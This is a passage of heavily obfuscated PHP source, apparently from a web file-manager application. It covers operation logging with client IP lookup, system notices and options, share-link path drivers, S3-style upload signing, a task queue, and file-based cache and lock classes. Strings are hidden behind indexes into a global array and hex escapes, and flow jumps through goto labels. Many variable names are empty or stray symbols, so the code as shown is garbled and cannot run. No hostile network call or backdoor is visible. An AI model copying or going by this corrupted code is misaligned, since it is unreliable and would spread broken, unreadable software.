$[2307] => LNG($[2308])); } private function typeFile() { $ =& $_SERVER[ʯ]; $岆 = array($[1874] => array($[1875]), $[2250] => array($[2309]), $[2252] => array($[2310]), $[1867] => array($[1868], $[2311]), $[2260] => array(), $[2262] => array(), $[2264] => array(), $[1877] => array($[1879]), $[1878] => array($[1879]), $[2268] => array($[2312]), $[2270] => array($[2312]), $[2272] => array($[2313]), $[2258] => array($[2314]), $[1872] => array($[2315]), $[2275] => array($[2316]), $[1871] => array($[1873])); return $岆; } private function typeAll() { $մߤ =& $_SERVER[ʯ]; $Ǟ = $this->typeList; $ؚȻ = array_filter($this->typeFile()); foreach ($ؚȻ as $펗 => $ͭ) { $Ǟ[$ͭ[0]] = $Ǟ[$펗]; } $Ǟ[$մߤ[1879]] = LNG($մߤ[2317]); $Ǟ[$մߤ[2312]] = LNG($մߤ[2318]); return $Ǟ; } public function addLog($ꀯ, $폄 = array()) { $ؖ =& $_SERVER[ʯ]; if (!isset($this->typeList[$ꀯ])) { return; } $ = isset($폄[$ؖ[1704]]) ? $폄[$ؖ[1704]] : 0; if (!$) { $ = Session::get($ؖ[2033]); } if ($ꀯ == $ؖ[2286] && is_array($폄[$ؖ[2319]]) && !$폄[$ؖ[2319]]) { return; } $ = get_client_ip(); if (!$폄 || strlen(json_encode($폄)) >= 1024) { $폄 = array($ؖ[2320] => $); } else { if (is_array($폄)) { $폄[$ؖ[2320]] = $; } else { $폄 = array($ؖ[1263] => $폄, $ؖ[2320] => $); } } $폄 = array($ؖ[1694] => Session::sign(), $ؖ[1695] => intval($), $ؖ[43] => $ꀯ, $ؖ[1697] => json_encode($폄)); parent::add($폄); } public function remove($џت) { $this->where(array($_SERVER[ʯ][469] => $џت))->delete(); } private function _makeOrder($ = '') { $ =& $_SERVER[ʯ]; $ = $[224]; $ٱ = array($[499] => $[500], $[501] => $[502]); $ș = Input::get($[507], $[7], $[2069], array($[1987], $[501])); $ș = $ٱ[$ș]; $ = $ . "{$}\40{$ș}"; return $this->order($); } public function get($㈏ = '') { $ۘ =& $_SERVER[ʯ]; if (!$㈏) { show_json(array()); } $ã = array(); if ($㈏[$ۘ[1704]]) { $ã[$ۘ[1704]] = $㈏[$ۘ[1704]]; } if (isset($㈏[$ۘ[820]])) { $ = $㈏[$ۘ[820]]; $ = isset($㈏[$ۘ[821]]) ? $㈏[$ۘ[821]] : time(); $ã[$ۘ[224]] = array($ۘ[385], array($, $)); } if ($㈏[$ۘ[43]]) { $Ńȹ = explode($ۘ[60], $㈏[$ۘ[43]]); $칾 = $this->typeFile(); $ꅊج = array(); foreach ($Ńȹ as $ê) { $ꅊج[] = $ê; if (isset($칾[$ê])) { $ꅊج = array_merge($ꅊج, $칾[$ê]); } } $ꅊج = array_unique($ꅊج); if ($ꅊج) { $ã[$ۘ[43]] = array($ۘ[7], $ꅊج); } } else { $ã[$ۘ[43]] = array($ۘ[2321], $ۘ[2322]); } if (!empty($㈏[$ۘ[2320]])) { $ã[$ۘ[502]] = array($ۘ[435], "\45{$㈏[$ۘ[2320]]}\45"); } $χ = $this->_makeOrder()->where($ã)->selectPage(); if (empty($χ[$ۘ[421]])) { show_json(array(), !0, $χ[$ۘ[418]]); } $χ[$ۘ[421]] = $this->logList($χ[$ۘ[421]]); return $χ; } private function ipAddress(&$ћ) { $鿉 =& $_SERVER[ʯ]; if (!empty($ћ[$鿉[2320]])) { $۾£ = IpLocation::get($ћ[$鿉[2320]]); } else { $۾£ = LNG($鿉[2323]); } $ћ[$鿉[2324]] = $۾£; } private function descZipDownload($ቍ, &$) { $ב =& $_SERVER[ʯ]; if (!isset($ቍ[$ב[2325]])) { return; } $ = json_decode($ቍ[$ב[2325]], !0); foreach ($ as $ԗ) { try { $ƌ = IO::infoFullSimple($ԗ[$ב[94]]); } catch (Exception $脒) { continue; } $ቍ[$ב[94]] = $ԗ[$ב[94]]; $[] = $ቍ[$ב[190]] = $ƌ[$ב[190]]; $[] = $ቍ[$ב[2124]] = $ƌ[$ב[189]]; break; } return $ቍ; } private function getSourceList(&$ӭ) { $ =& $_SERVER[ʯ]; $݋㎭ = array(); foreach ($ӭ as $ => $ˮ) { $ = json_decode($ˮ[$[502]], !0); if ($ˮ[$[43]] == $[1870]) { $ = $this->descZipDownload($, $݋㎭); $ӭ[$][$[502]] = json_encode($); continue; } if (strpos($ˮ[$[43]], $[2126]) !== 0) { if (!isset($[$[94]]) || strpos($ˮ[$[43]], $[2326]) !== 0) { continue; } try { $ˆ = IO::infoFullSimple($[$[94]]); } catch (Exception $ׅ) { continue; } $݋㎭[] = $[$[190]] = $ˆ[$[190]]; $݋㎭[] = $[$[2124]] = $ˆ[$[189]]; $ӭ[$][$[502]] = json_encode($); continue; } $݋㎭[] = $[$[190]]; $݋㎭[] = $[$[2124]]; if ($[$[43]] == $[596]) { $݋㎭[] = $[$[502]][$[1221]]; $݋㎭[] = $[$[502]][$[1222]]; } if ($[$[43]] == $[2134]) { $݋㎭[] = $[$[502]][$[190]]; } } if (!$݋㎭) { return array(); } return Model($[885])->sourceListInfo($݋㎭, !0); } private function logList($ܩ) { $ɂ =& $_SERVER[ʯ]; $ȵМ = array_to_keyvalue($ܩ, $ɂ[12], $ɂ[1704]); $ŵ = Model($ɂ[575])->userListInfo(array_unique($ȵМ)); $ = $this->getSourceList($ܩ); $ڈ = $this->typeAll(); $ = array(); $ÄĀ = array(); foreach ($ܩ as $ => $) { $ = $[$ɂ[43]]; $ = isset($ŵ[$[$ɂ[1704]]]) ? $ŵ[$[$ɂ[1704]]] : !1; $ = strpos($, $ɂ[2327]) === 0 ? LNG($ɂ[2328]) : LNG($ɂ[2323]); $[$ɂ[42]] = isset($[$ɂ[42]]) ? $[$ɂ[42]] : LNG($ɂ[2323]); $[$ɂ[2178]] = isset($[$ɂ[2178]]) ? $[$ɂ[2178]] : $ɂ[12]; $[$ɂ[1601]] = isset($ڈ[$]) ? $ڈ[$] : $; $[$ɂ[2068]] = $; $ׇ = json_decode($[$ɂ[502]], !0); $[$ɂ[2320]] = isset($ׇ[$ɂ[2320]]) ? $ׇ[$ɂ[2320]] : $ɂ[12]; $[$ɂ[2324]] = IpLocation::get($[$ɂ[2320]]); if (strpos($, $ɂ[2126]) === 0 || isset($ׇ[$ɂ[2124]])) { $ׇ[$ɂ[97]] = $[$ׇ[$ɂ[190]]]; $ׇ[$ɂ[2139]] = $[$ׇ[$ɂ[2124]]]; if ($ׇ[$ɂ[43]] == $ɂ[596]) { $ׇ[$ɂ[502]][$ɂ[1221]] = $[$ׇ[$ɂ[502]][$ɂ[1221]]]; $ׇ[$ɂ[502]][$ɂ[1222]] = $[$ׇ[$ɂ[502]][$ɂ[1222]]]; } if ($ׇ[$ɂ[43]] == $ɂ[2134]) { $ׇ[$ɂ[502]][$ɂ[190]] = $[$ׇ[$ɂ[502]][$ɂ[190]]]; } if ($ׇ[$ɂ[43]] == $ɂ[1865]) { $ׇ[$ɂ[2139]] = $ׇ[$ɂ[97]]; $ׇ[$ɂ[2124]] = $ׇ[$ɂ[2139]][$ɂ[190]]; $ׇ[$ɂ[97]] = !1; $ׇ[$ɂ[190]] = $ɂ[12]; } if ($ׇ[$ɂ[97]] && $ׇ[$ɂ[97]][$ɂ[187]] == $ɂ[188]) { $ÄĀ[] = $[$ɂ[451]]; unset($ܩ[$]); continue; } if ($ׇ[$ɂ[2139]] && $ׇ[$ɂ[2139]][$ɂ[187]] == $ɂ[188]) { $ÄĀ[] = $[$ɂ[451]]; unset($ܩ[$]); continue; } } $[$ɂ[502]] = $ׇ; unset($[$ɂ[2329]]); $[] = $; } $this->clearSystemPathLog($ÄĀ); return $; } private function clearSystemPathLog($) { $Ծ =& $_SERVER[ʯ]; if (count($) == 0) { return; } $ = array($Ծ[451] => array($Ծ[7], array_unique($))); $this->where($)->delete(); } public function deviceList($, $ = 0) { $ʀĻ =& $_SERVER[ʯ]; $얏 = array($ʀĻ[1704] => $, $ʀĻ[224] => array($ʀĻ[1075], $), $ʀĻ[43] => $ʀĻ[1839]); $ʋ = array(); $ۘ = $this->field($ʀĻ[2330])->where($얏)->order($ʀĻ[2137])->limit(50)->select(); foreach ($ۘ as $ => $) { if ($ > 0 && abs($[$ʀĻ[224]] - $ۘ[$ - 1][$ʀĻ[224]]) < 5) { continue; } $ݩ = json_decode($[$ʀĻ[502]], !0); $[$ʀĻ[2320]] = isset($ݩ[$ʀĻ[2320]]) ? $ݩ[$ʀĻ[2320]] : $ʀĻ[12]; unset($ݩ[$ʀĻ[2320]]); $ݱ = $this->deviceType($ݩ[$ʀĻ[2127]]); if (isset($ʋ[$ݱ])) { continue; } $[$ʀĻ[2324]] = IpLocation::get($[$ʀĻ[2320]]); $[$ʀĻ[502]] = $ݩ; $ʋ[$ݱ] = $; } return array_values($ʋ); } public function deviceType($ǋײ) { return $ǋײ; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\x65\155\x2e\x6e\x6f\164\x69\143\145\114\151\x73\x74"; public $field = array("\x6e\141\155\x65", "\143\x6f\x6e\164\145\x6e\x74", "\x61\165\164\x68", "\155\157\x64\x65", "\x74\151\x6d\x65", "\164\x79\160\145", "\154\145\x76\145\154", "\x65\x6e\141\142\154\145", "\163\157\162\x74"); public function listData($ފ = false, $ = "\x73\x6f\162\164", $ϰ = false) { return parent::listData($ފ, $, $ϰ); } public function add($) { $ =& $_SERVER[ʯ]; $ҌԸ = time(); if ($[$[26]] == $[2331]) { $ҌԸ = strtotime($[$[203]]); } $[$[203]] = $ҌԸ; return parent::insert($); } public function update($, $) { $ǐ =& $_SERVER[ʯ]; $뿑Ο = $this->listData($); if (!$뿑Ο) { return !1; } $ = time(); if ($[$ǐ[26]] == $ǐ[2331]) { $ = strtotime($[$ǐ[203]]); } $[$ǐ[203]] = $; return parent::update($, $); } public function remove($ڿ) { $ = $this->listData($ڿ); if (!$ || $[$_SERVER[ʯ][188]]) { return !1; } return parent::remove($ڿ); } public function sort($Ś, $) { return parent::update($Ś, $); } public function enable($, $ک) { return parent::update($, array($_SERVER[ʯ][2332] => $ک)); } private function initUserOption() { $߬ީ =& $_SERVER[ʯ]; $this->optionType = $߬ީ[2333]; $this->modelType = $߬ީ[2334]; $this->field = array($߬ީ[2335], $߬ީ[42], $߬ީ[203], $߬ީ[43], $߬ީ[2336], $߬ީ[810], $߬ީ[219]); } public function userNoticeGet($ = false) { $this->initUserOption(); return parent::listData($, $_SERVER[ʯ][451], !0); } public function userNoticeAdd($) { $鮵 =& $_SERVER[ʯ]; $this->initUserOption(); $ț = $this->findByKey($鮵[2335], $[$鮵[451]]); if ($ț) { return !0; } $Ҙ = array($鮵[2335] => $[$鮵[451]], $鮵[42] => $[$鮵[42]], $鮵[203] => $[$鮵[203]], $鮵[43] => isset($[$鮵[43]]) ? $[$鮵[43]] : 1, $鮵[2336] => isset($[$鮵[2336]]) ? $[$鮵[2336]] : 0, $鮵[810] => 0, $鮵[219] => 0); return parent::insert($Ҙ); } public function userNoticeEdit($, $) { $this->initUserOption(); return parent::update($, $); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\171\163\x74\x65\155\137\157\160\x74\151\157\x6e"; protected $jsonField = array("\155\x65\156\165", "\162\x6f\154\145", "\162\x6f\x6c\x65\107\162\x6f\x75\x70", "\162\x65\x67\151\163\164", "\x65\x6d\141\x69\154"); function __construct() { parent::__construct(); } protected function cacheKey($Ŵ) { return "\x53\x79\x73\164\145\155\x4f\x70\x74\x69\x6f\156\x5f{$Ŵ}"; } protected function optionDefault($ۍ㱉 = '') { $ƆҚ =& $_SERVER[ʯ]; if ($ۍ㱉 == $ƆҚ[12]) { return $GLOBALS[$ƆҚ[6]][$ƆҚ[433]]; } } } goto C퐗ܛ; A勄: class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($) { $this->pathParse = $; } protected function infoParse($ꕕ, $ = false) { $ɸ =& $_SERVER[ʯ]; return Action($ɸ[1235])->sharePathInfo($this->pathParse[$ɸ[94]], !0, $); } public function listPath($, $Ӯ = false) { $ =& $_SERVER[ʯ]; $٠ = IO::listPath($, $Ӯ); if (!$٠) { return $٠; } if (is_array($٠[$[1401]])) { $ = Action($[1410])->parsePathChildren($٠[$[1401]], array($[471] => $)); $٠[$[1401]] = Action($[1235])->shareItemInfo($); } foreach ($٠ as $ => $) { if (!in_array($, array($[93], $[92]))) { continue; } foreach ($ as $ȩ => $) { $ = Action($[1410])->parsePathChildren($, array($[471] => $)); $٠[$][$ȩ] = Action($[1235])->shareItemInfo($); } } return $٠; } } class PathDriverEDS extends PathDriverMinIO { public function __construct($ҭ) { parent::__construct($ҭ); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($ǽ) { parent::__construct($ǽ); $this->signatureVersion($_SERVER[ʯ][240]); } public function uploadFormData($, $ = 3600) { $ϩ =& $_SERVER[ʯ]; $ = $ϩ[222]; $ = $ϩ[261]; $Ѷ = $ϩ[72]; $ = gmdate($ϩ[262]); $͡ = gmdate($ϩ[263]); $ = $ϩ[264]; $ = $ . $ϩ[12]; $ = $ϩ[265]; $ = array($this->accessKey, $͡, $this->region, $Ѷ, $); $ = implode($ϩ[8], $); $ = array($ϩ[266] => gmdate($ϩ[1385], strtotime($ϩ[268])), $ϩ[269] => array(array($ϩ[270] => $this->bucket), array($ϩ[271] => $), array($ϩ[272], $ϩ[273], $ϩ[12]), array($ϩ[272], $ϩ[274], $ϩ[12]), array($ϩ[272], $ϩ[275], $ϩ[12]), array($ϩ[276] => $), array($ϩ[277] => $), array($ϩ[278] => $), array($ϩ[279] => $), array($ϩ[280] => $))); $Ԓ = base64_encode(json_encode($)); $ = hash_hmac($ϩ[281], $͡, $ϩ[282] . $this->secret, !0); $ = hash_hmac($ϩ[281], $this->region, $, !0); $ = hash_hmac($ϩ[281], $Ѷ, $, !0); $؛ = hash_hmac($ϩ[281], $, $, !0); $ = hash_hmac($ϩ[281], $Ԓ, $؛); $ = array($ϩ[239] => $ϩ[12], $ϩ[283] => $ϩ[12], $ϩ[271] => $, $ϩ[276] => $, $ϩ[284] => $Ԓ, $ϩ[285] => $, $ϩ[286] => $, $ϩ[287] => $, $ϩ[288] => $, $ϩ[289] => $, $ϩ[205] => $this->getHost()); return $; } } goto Aì; CɎ: class TaskHttp extends Task { protected function startAfter() { $Ŗ =& $_SERVER[ʯ]; $遲 =& $this->task; $遲[$Ŗ[1781]] = 1; Hook::bind($Ŗ[1749], array($this, $Ŗ[1782])); Hook::bind($Ŗ[1751], array($this, $Ŗ[1783])); Hook::bind($Ŗ[1753], array($this, $Ŗ[1784])); } protected function endAfter() { $㍖ =& $_SERVER[ʯ]; Hook::unbind($㍖[1749], array($this, $㍖[1782])); Hook::unbind($㍖[1751], array($this, $㍖[1783])); Hook::unbind($㍖[1753], array($this, $㍖[1784])); } public function progressStart($) { $ =& $_SERVER[ʯ]; $㥌 = curl_getinfo($); self::log($[1785] . $㥌[$[359]]); self::valueSet($this->task[$[451]], $this->task); } public function progressEnd($ה) { $Ԇ =& $_SERVER[ʯ]; self::log($Ԇ[1786] . $this->task[$Ԇ[451]]); $this->end(); } public function progress($, $, $, $¶, $š) { $ѤĲ =& $_SERVER[ʯ]; $ =& $this->task; if ($š > 0) { $[$ѤĲ[846]] = $[$ѤĲ[846]] == 0 ? $¶ : $[$ѤĲ[846]]; $[$ѤĲ[1705]] = $š; } else { if ($ > 0) { $[$ѤĲ[846]] = $[$ѤĲ[846]] == 0 ? $ : $[$ѤĲ[846]]; $[$ѤĲ[1705]] = $; } } $this->update(); self::log("\160\162\x6f\x67\162\x65\x73\163\x48\x74\164\x70\x3a\144\157\x77\156\72{$}\x2f{$}\x3b\40\x75\x70\154\157\141\144\x3a{$š}\57{$¶}\x3b"); } } class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($ř, $ړ = '', $õ = 0, $󩏔 = '') { $ =& $_SERVER[ʯ]; $ѓ = new Task($ř, $ړ, $õ, $󩏔); $GLOBALS[$[1787] . $ř] = new TaskLog($[1688], $ѓ, $󩏔); return $ѓ; } public function __construct($蚙ޒ = '', $ = '', $Ķ = '') { $ë =& $_SERVER[ʯ]; if (!$蚙ޒ) { $蚙ޒ = $ë[1688]; } $ě = $蚙ޒ . $ë[438] . rand_string(10); if (!$Ķ) { $Ķ = $蚙ޒ . $ë[63] . $Ķ; } switch ($蚙ޒ) { case $ë[1688]: if (!$ || !$->task) { return echoLog($蚙ޒ . $ë[1788]); } $ԕ = $; $ě = $ԕ->task[$ë[451]]; $蚙ޒ = $ԕ->task[$ë[451]]; if (!$ԕ->task[$ë[1601]]) { $ԕ->task[$ë[1601]] = $Ķ ? $Ķ : $蚙ޒ; } break; case $ë[1789]: if (!$) { return echoLog($蚙ޒ . $ë[1790]); } $ = is_string($) ? array($) : $; $ԕ = new TaskFileTransfer($ě, $蚙ޒ, 0, $Ķ ? $Ķ : $[0]); foreach ($ as $) { $ԕ->addPath($); } break; case $ë[365]: if (!$) { return echoLog($蚙ޒ . $ë[1790]); } $ = is_string($) ? array($) : $; $ԕ = new TaskZip($ě, $蚙ޒ, 0, $Ķ ? $Ķ : $[0]); foreach ($ as $) { $ԕ->addPath($); } break; case $ë[1275]: if (!$) { return echoLog($蚙ޒ . $ë[1790]); } $ԕ = new TaskUnZip($ě, $蚙ޒ, 0, $Ķ ? $Ķ : $); if ($) { $ԕ->addFile($); } break; case $ë[158]: $ԕ = new TaskHttp($ě, $蚙ޒ); break; default: return; break; } $this->task = $ԕ; $this->taskID = $ě; Hook::bind($ë[1725], array($this, $ë[1791])); Hook::bind($ë[1727], array($this, $ë[1792])); Hook::bind($ë[1721], array($this, $ë[1793])); echoLog($ë[1794] . $ԕ->task[$ë[1601]]); } public function __destruct() { $this->end(); } public function end($Р = '') { $ =& $_SERVER[ʯ]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($Р); $this->task = !1; $this->taskID = !1; Hook::unbind($[1725], array($this, $[1791])); Hook::unbind($[1727], array($this, $[1792])); Hook::unbind($[1721], array($this, $[1793])); } public function taskUpdate($ߦ) { $ =& $_SERVER[ʯ]; if (!$ߦ || $this->taskID != $ߦ[$[451]]) { return; } $ɱ = 20; $핃 = intval($ߦ[$[1706]] * $ɱ); $ = $[172] . str_repeat($[945], $핃) . $[1075] . str_repeat($[63], $ɱ - $핃) . $[174]; $ = $ . sprintf($[1795], $ߦ[$[1706]] * 100) . $[1796]; $𗎞 = $ . $ߦ[$[1705]] . $[8] . $ߦ[$[846]] . LNG($[1797]); $暑 = $[12]; if ($ߦ[$[1781]]) { $𗎞 = $ . size_format($ߦ[$[1705]]) . $[8] . size_format($ߦ[$[846]]); $暑 = size_format($ߦ[$[1707]]) . $[1798]; } if ($ߦ[$[1125]]) { $ߦ[$[1755]] = $ߦ[$[1125]] . $[63] . $ߦ[$[1755]]; } if ($ߦ[$[1755]]) { $Ҟ = $[12]; if ($ߦ[$[1757]]) { $Ҟ = $[60] . size_format($ߦ[$[1758]]) . $[8] . size_format($ߦ[$[1757]]); } $暑 .= $ߦ[$[1755]] . $Ҟ; } if ($ߦ[$[823]] && !$ߦ[$[1757]]) { $暑 .= $[63] . size_format($ߦ[$[1762]]) . $[8] . size_format($ߦ[$[823]]); } echoLog($𗎞 . $[63] . $暑, !0); } public function taskEnd($߳) { $ؖ =& $_SERVER[ʯ]; if (!$߳ || $this->taskID != $߳[$ؖ[451]]) { return; } $ = $߳ ? $߳[$ؖ[1705]] . $ؖ[8] . $߳[$ؖ[846]] . LNG($ؖ[1797]) . $ؖ[81] : $ؖ[12]; echoLog($ؖ[1799] . $߳[$ؖ[1601]] . ($߳[$ؖ[502]] ? $ؖ[81] . $߳[$ؖ[502]] : $ؖ[12]) . $ؖ[81] . $ . $ؖ[1800] . sprintf($ؖ[911], timeFloat() - $߳[$ؖ[1708]]) . $ؖ[1720]); $this->end(); } public function taskKill($堤̿) { $ԣʌ =& $_SERVER[ʯ]; if (!$堤̿ || $this->taskID != $堤̿[$ԣʌ[451]]) { return; } echoLog($ԣʌ[1801] . $堤̿[$ԣʌ[1601]]); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\x74\x61\163\153\121\x75\x65\165\145\x4c\145\x6e\147\x74\150"; const QUEUE_DATA = "\x74\x61\163\153\121\165\x65\x75\145\104\x61\x74\x61"; const QUEUE_TIME = "\x74\141\x73\x6b\121\x75\145\x75\x65\x4c\x61\163\x74\x52\x75\156"; const QUEUE_THREAD = "\x74\x61\163\x6b\121\x75\x65\165\145\124\150\x72\145\141\x64"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($֎, $ꮔƀ = array(), $ = '', $ = '') { $̳ =& $_SERVER[ʯ]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($ && array_find_by_field(self::$listData, $̳[104], $)) { return !0; } if ($ && array_find_by_field(self::$listDataAdd, $̳[104], $)) { return !0; } self::$listDataAdd[] = array($̳[316] => $֎, $̳[1802] => $ꮔƀ, $̳[502] => $, $̳[104] => $); return !0; } public static function addSubmit() { $ =& $_SERVER[ʯ]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($[1803] . json_encode_force(array_to_keyvalue(self::$listDataAdd, $[12], $[502])), $[194]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($, $҉ = array(), $ = '', $ = '') { $ =& $_SERVER[ʯ]; if (self::count() >= self::MAX_LENGTH) { return !1; } $ߪ = self::getAll(); if ($ && array_find_by_field($ߪ, $[104], $)) { return !0; } $ߪ[] = array($[316] => $, $[1802] => $҉, $[502] => $, $[104] => $); self::setAll($ߪ); write_log($[1803] . $, $[194]); return !0; } public static function run() { $೰ =& $_SERVER[ʯ]; $򃌩 = self::getAll(); $ِ޾ = array_shift($򃌩); if (!$ِ޾) { return !1; } self::setAll($򃌩); $ͮ = timeFloat(); $܈ = $೰[12]; try { $܈ = Hook::apply($ِ޾[$೰[316]], $ِ޾[$೰[1802]]); } catch (Exception $) { write_log($, $೰[1243]); } $Ǳ = number_format(timeFloat() - $ͮ, 3) . $೰[1720]; if ($܈ && is_string($܈)) { $Ǳ = $Ǳ . $೰[1804] . $܈; } write_log($೰[1805] . $ِ޾[$೰[502]] . $೰[1806] . $Ǳ, $೰[194]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $Ӆ =& $_SERVER[ʯ]; $ = self::threadCount() + 1; if ($ > 3 || !self::count()) { return; } write_log($Ӆ[1807] . $, $Ӆ[194]); Cache::set(self::QUEUE_THREAD, $, 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($Ӆ[1808], $Ӆ[194]); } public static function getKey($, $򙺊 = "\x69\x6e\x74") { $ˈ =& $_SERVER[ʯ]; Cache::removeMemory($); $ = Cache::get($); if ($򙺊 == $ˈ[340]) { return $ ? intval($) : 0; } if ($򙺊 == $ˈ[1809]) { return is_array($) ? $ : array(); } return $; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[ʯ][1809]); } public static function setAll($ř) { $Ə = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($ř), $Ə); Cache::set(self::QUEUE_DATA, $ř, $Ə); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } goto eі; C: class Cache { protected static $handle; protected static $memoryCache; public static function init() { $ =& $_SERVER[ʯ]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $ = $GLOBALS[$[6]][$[401]]; $éד = $[$[$[887]]]; $ = $[$[888]]; switch ($[$[887]]) { case $[31]: self::$handle = Model($[889]); break; case $[890]: self::$handle = new CacheRedis($éד, $); break; case $[891]: self::$handle = new CacheMemcached($éד, $); break; case $[223]: self::$handle = new CacheFile($éד, $); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($) { if (is_array($) || is_object($)) { $ = json_encode($); } $ = rawurlencode($); return md5(KOD_SITE_ID . $_SERVER[ʯ][11] . $); } public static function get($, $ = false) { $ = self::key($); $ظ = self::init(); if ($) { return unserialize($ظ->get($)); } if (!isset(self::$memoryCache[$])) { $㥃 = $ظ->get($); self::$memoryCache[$] = unserialize($㥃); } return self::$memoryCache[$]; } public static function set($̓, $¨, $϶ = false) { $ =& $_SERVER[ʯ]; $ = self::key($̓); if (isset(self::$memoryCache[$]) && self::$memoryCache[$] === $¨) { return !0; } if ($϶ === 0) { self::$memoryCache[$] = $¨; return !0; } $ = self::init(); $٭ = serialize($¨); CacheLock::lock($̓ . $[892]); $¾ = $->set($, $٭, $϶); self::$memoryCache[$] = $¨; CacheLock::unlock($̓ . $[892]); return $¾; } public static function getCall($Ο, $Άγ, $𘭗, $ = array()) { $ =& $_SERVER[ʯ]; $ͤ = self::get($Ο); if ($ͤ || $ͤ === $[12]) { return $ͤ; } $ͤ = call_user_func_array($𘭗, $); $ͤ = $ͤ ? $ͤ : $[12]; self::set($Ο, $ͤ, $Άγ); return $ͤ; } public static function remove($܃) { $ϳ = self::key($܃); unset(self::$memoryCache[$ϳ]); self::clearTimeout(); CacheLock::lock($܃); $ = self::init()->remove($ϳ); CacheLock::unlock($܃); return $; } public static function removeMemory($ٻ) { $Ǵ = self::key($ٻ); unset(self::$memoryCache[$Ǵ]); } public static function clearMemory($ХŃ = false) { if ($ХŃ) { $ХŃ = self::key($ХŃ); unset(self::$memoryCache[$ХŃ]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[ʯ][893])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[ʯ][894])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($̐Տ, $Ә) { $Ҽ =& $_SERVER[ʯ]; $this->cachePath = $̐Տ[$Ҽ[94]]; $this->prefix = $Ҽ[895]; $this->cacheTime = $Ә; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($ϝ) { $ =& $_SERVER[ʯ]; $ϝ = str_replace(array($[896], $[107], $[83]), $[897], $ϝ); return $this->cachePath . $[898] . $ϝ . $[899]; } public function set($, $, $ň = false) { $ň = $ň ? $ň : $this->cacheTime; $ύ˾ = $this->getFile($); if (file_put_contents($ύ˾, $this->prefix . $, LOCK_EX)) { @touch($ύ˾, intval(time() + $ň)); clearstatcache(); return !0; } @unlink($ύ˾); return !1; } public function get($) { $ = $this->getFile($); if (file_exists($) && filemtime($) < time()) { @unlink($); return !1; } $ = @file_get_contents($); return substr($, strlen($this->prefix)); } public function remove($ކ) { $ = $this->getFile($ކ); return @unlink($); } public function deleteAll() { $ԑҞϸ =& $_SERVER[ʯ]; $ = scandir($this->cachePath); foreach ($ as $¦) { $ = $this->cachePath . $¦; if (strpos($, $ԑҞϸ[899]) && strpos($, $ԑҞϸ[900])) { @unlink($); } } } public function clearTimeout() { $߂ =& $_SERVER[ʯ]; $ӎ = scandir($this->cachePath); foreach ($ӎ as $۩) { $ϗ = $this->cachePath . $۩; if (strpos($ϗ, $߂[899]) && strpos($ϗ, $߂[900]) && filemtime($ϗ) < time()) { @unlink($ϗ); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $ܘѱ =& $_SERVER[ʯ]; if (self::$handle) { return self::$handle; } $ = $GLOBALS[$ܘѱ[6]][$ܘѱ[401]]; self::$timeout = $[$ܘѱ[901]] ? $[$ܘѱ[901]] : 10; $ԩʶ = _get($GLOBALS[$ܘѱ[6]], $ܘѱ[902]); $ = $[$ܘѱ[887]] ? $[$ܘѱ[887]] : $ܘѱ[223]; if ($ == $ܘѱ[31] && $ԩʶ == $ܘѱ[23]) { $ = $ܘѱ[223]; } switch ($) { case $ܘѱ[890]: self::$handle = new CacheLockRedis(); break; case $ܘѱ[891]: self::$handle = new CacheLockMemcached(); break; case $ܘѱ[31]: self::$handle = new CacheLockDatabase(); break; case $ܘѱ[223]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($ܘѱ[903], $ܘѱ[904]); } return self::$handle; } private static function key($ʒ) { return $_SERVER[ʯ][905] . Cache::key($ʒ); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($Ꮒ = '') { self::$errorMsg = $Ꮒ; } public static function lockGlobal($ɳ, $÷) { return self::lock($ɳ, $÷, !0); } public static function lock($鞾, $໘ٺ = false, $Ŭ̿ = false) { $ =& $_SERVER[ʯ]; $˞ܽ = self::init(); $Ϭ = self::key($鞾); $໘ٺ = $໘ٺ ? $໘ٺ : self::$timeout; $܃ = timeFloat(); $퓲 = $˞ܽ->lock($Ϭ, $໘ٺ); $ݪ = timeFloat(); if (!$퓲) { $ = "\x6c\x6f\143\153\x20\145\x72\x72\x6f\x72\x3b\x6b\x65\x79\x3d{$鞾}\73\x74\151\x6d\x65\x3d{$໘ٺ}\x3b" . self::$errorMsg . $[81] . get_caller_msg(); $ = LNG($[906]) . "\50{$໘ٺ}\163\51\56" . LNG($[907]); $ 